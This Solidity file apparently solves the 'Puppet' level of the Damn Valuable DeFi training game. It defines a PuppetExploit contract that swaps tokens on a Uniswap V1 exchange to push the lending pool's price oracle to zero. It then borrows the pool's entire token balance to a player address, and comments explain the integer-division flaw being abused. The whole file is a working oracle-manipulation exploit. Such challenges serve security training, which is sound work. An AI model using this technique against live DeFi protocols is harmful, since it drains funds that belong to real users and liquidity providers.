// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";
import "./Iuniswap.sol";


contract PuppetExploit{
    DamnValuableToken token;
    PuppetPool pool;
    IUniswapV1Exchange uniswap;

    

    constructor(address _token, address _pool, address _uniswap)payable{
        token = DamnValuableToken(_token);
        pool = PuppetPool(_pool);
        uniswap = IUniswapV1Exchange(_uniswap);
    }

   function attack(uint256 amount, address player) payable public {
    // trade tokens to ETH to increase tokens balance in uniswap
    require(token.balanceOf(address(this)) >= amount, "not enough tokens");
    token.approve(address(uniswap), amount);
    uint256 ethGained =
        uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);

    // computeOraclePrice has integer division issue which will make price 0
    // as soon as token balance is greater than ETH balance
    // require(pool.calculateDepositRequired(amount) == 0, "oracle price not 0");

    // now borrow everything from the pool at a price of 0
    pool.borrow{value : 22 ether}(token.balanceOf(address(pool)),player);

    // success condition is that attacker's ETH balance did not decrease
    // but it reduced due to gas cost, just send back the eth we gained from the swap
    // transfer all tokens & eth to attacker EOA
    // require(
    //     token.transfer(player, token.balanceOf(address(this))),
    //     "token transfer failed"
    // );
    // payable(player).transfer(ethGained);
}

function returnether(address player) payable public{
    payable(player).transfer(address(this).balance);
}

// required to receive ETH from uniswap
receive() external payable {}

    
}